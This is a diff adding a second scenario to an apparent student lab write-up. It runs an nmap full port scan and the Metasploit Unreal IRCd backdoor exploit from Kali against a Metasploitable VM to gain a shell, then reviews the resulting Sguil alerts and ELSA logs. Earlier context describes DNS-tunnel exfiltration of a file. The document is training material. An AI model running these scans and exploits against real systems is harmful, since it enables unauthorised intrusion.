@@ -8,6 +8,7 @@ The second part of the lab focuses on data exfiltration. The attacker, having ga
 
 confidential.txt) into a hexadecimal format. This hexadecimal data is then embedded within DNS queries and sent to the Metasploitable server, which is configured as a DNS server. The attacker uses a shell script to automate this process, effectively using the DNS service as a covert channel to leak the file's contents. The exfiltrated data is then retrieved, reassembled, and verified on the Kali machine.
 
+# Scenario 1
 ## Environment of the setup 
 <img width="600" height="310" alt="image" src="https://github.com/user-attachments/assets/ef74a7f1-7e99-47af-a9f3-c42866aacb21" />
 
@@ -69,6 +70,112 @@ Here, I have manually decoded exfiltrated data using a simple hex-to-text conver
 - I have decoded it locally with xxd.
 - I have revealed the confidential contents successfully.
 
+# Scenario 2 
+### This is a hands-on lab where we use Kali Linux to scan and exploit a vulnerable Metasploitable VM, and then catch everything in action using Security Onion's monitoring tools like **Sguil** and **ELSA**.
+
+## Step 1 
+### Start Sguil Monitoring
+On the Security Onion desktop:
+Launch Sguil
+When asked which networks to monitor, choose all interfaces
+Click Start and let it run in the background
+
+## Step 2 
+### Port Scan with Nmap (from Kali)
+On the  Kali terminal, scan the Metasploitable machine:
+```bash
+nmap -p- -v -sS -A -T4 209.165.200.235
+```
+This scan might take a bit — it's doing a full port sweep.
+
+After that i took a note of:
+
+✅ Open ports
+
+✅ Running services
+
+
+## Step 3
+### Exploit the Unreal IRC Backdoor
+
+Time for some ethical hacking.
+
+Still in Kali, launch Metasploit:
+```bash
+msfconsole
+search unreal
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+set RHOST 209.165.200.235
+exploit
+```
+This being sucessful will give a sucessful shell access, after that 
+```bash
+whoami
+hostname
+ls
+ifconfig
+```
+<img width="600" height="542" alt="image" src="https://github.com/user-attachments/assets/4203ce95-61b8-4cf3-ab53-9c9ee4cef2c0" />
+
+
+## Step 4
+### Watch the Alarms in Sguil
+
+Jump back to Security Onion.
+
+In Sguil, we should now see a bunch of alerts — especially from your port scan and exploit.
+
+Do the following:
+
+Right-click alerts → View Correlated Events
+
+View Packet Data, Rules, and Transcripts for deeper info
+
+I picked Pick 3 interesting alerts and screenshot their details.
+
+<img width="600" height="623" alt="image" src="https://github.com/user-attachments/assets/81c407cf-503c-44b1-ad5f-b67e36c07cf9" />
 
 
 
+<img width="600" height="555" alt="image" src="https://github.com/user-attachments/assets/6fd2d2d1-38fc-49e2-b108-a1d9735661e0" />
+
+<img width="600" height="263" alt="image" src="https://github.com/user-attachments/assets/2a0fea09-a150-436a-8d34-680972b0f54b" />
+
+## Correlated Events
+
+<img width="600" height="427" alt="image" src="https://github.com/user-attachments/assets/78f26a06-e583-4910-aade-a3562812f434" />
+
+
+## Step 5
+### Dig into Logs with ELSA
+
+Time to go log-hunting. Open ELSA on the Security Onion desktop.
+
+🔹 BRO_CONN
+- Search and group by DstPort
+- See what ports were hit
+
+<img width="600" height="567" alt="image" src="https://github.com/user-attachments/assets/3dc29320-47e4-4bf4-a5b5-10be6f0884a6" />
+
+🔹 BRO_DNS
+- Group by hostname
+- Look for suspicious DNS activity (hint: filter by port 53)
+
+<img width="600" height="547" alt="image" src="https://github.com/user-attachments/assets/ce873771-c13a-4b62-bbf3-31c93c5802f7" />
+
+🔹 BRO_HTTP
+- Group by site
+- Click a result → then click info → download the PCAP via CapMe
+- Human-readable logs will also show up if we switch Output to BRO
+
+<img width="600" height="605" alt="image" src="https://github.com/user-attachments/assets/cdaa3ac5-4b4d-4c73-8090-36a26e0dc638" />
+
+🔹 BRO_NOTICE
+- Group by notice type
+- See what Security Onion flagged
+
+<img width="600" height="436" alt="image" src="https://github.com/user-attachments/assets/cfb22ec7-5e66-49ab-98fc-37393ebcb14d" />
+
+## Conclusion
+
+This lab was a solid dive into both sides of cybersecurity — offense and defense. Using Kali, I ran a real exploit on a vulnerable system, then flipped perspectives to see how Security Onion picked it all up behind the scenes. It’s one thing to run tools, but seeing the alerts, logs, and traffic come together made it feel real. It showed just how important visibility is in network defense. Overall, this was a great hands-on experience that tied together scanning, exploitation, and monitoring — and gave me a better understanding of how attackers move and how defenders catch them.
